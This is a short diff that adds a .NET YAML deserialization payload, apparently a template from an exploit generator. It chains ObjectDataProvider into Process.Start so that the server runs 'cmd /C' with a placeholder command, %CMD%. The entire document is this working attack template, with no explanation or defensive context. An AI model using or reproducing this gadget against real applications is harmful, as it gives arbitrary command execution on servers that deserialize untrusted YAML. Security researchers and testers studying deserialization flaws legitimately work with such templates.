@@ -1,0 +1,11 @@
+!<!System.Windows.Data.ObjectDataProvider%2c%20PresentationFramework%2c%20Version=4.0.0.0%2c%20Culture=neutral%2c%20PublicKeyToken=31bf3856ad364e35> {
+    MethodName: Start,
+	ObjectInstance: 
+		!<!System.Diagnostics.Process%2c%20System%2c%20Version=4.0.0.0%2c%20Culture=neutral%2c%20PublicKeyToken=b77a5c561934e089> {
+			StartInfo:
+				!<!System.Diagnostics.ProcessStartInfo%2c%20System%2c%20Version=4.0.0.0%2c%20Culture=neutral%2c%20PublicKeyToken=b77a5c561934e089> {
+					FileName : cmd,
+					Arguments : '/C %CMD%'
+                }
+        }
+}
